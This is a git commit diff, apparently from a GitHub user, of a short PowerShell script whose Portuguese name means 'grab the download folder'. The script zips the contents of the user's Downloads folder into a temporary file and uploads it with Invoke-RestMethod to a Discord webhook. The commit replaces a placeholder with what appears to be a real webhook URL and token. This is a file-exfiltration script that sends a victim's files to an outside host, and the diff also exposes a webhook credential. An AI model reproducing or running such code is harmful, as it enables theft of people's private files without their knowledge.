0dcb3c764466215c2687a389ac87ebe3a17aa2d9
Gabritheltic <95049175+Gabritheltic@users.noreply.github.com>
2024-07-29 14:37:42 -0300

    pegar-a-pasta-dowload.ps1

--- pegar-a-pasta-dowload.ps1
+++ pegar-a-pasta-dowload.ps1
@@ -6,7 +6,7 @@ $zipPath = "$env:TEMP\downloads.zip"
 Compress-Archive -Path "$downloadDir\*" -DestinationPath $zipPath -Force
 
 # URL do webhook do Discord
-$webhookUrl = "https://discord.com/api/webhooks/SEU_WEBHOOK"
+$webhookUrl = "https://discord.com/api/webhooks/1267179289405689968/LF81UG85FOKiGwBcxrnc7pg4hrL_tYSR_hX8vFOv56spGcpOUy5-JTuUZKA6KSJtUqxr"
 
 # Envia o arquivo zip para o webhook do Discord
 Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $zipPath -ContentType "multipart/form-data"
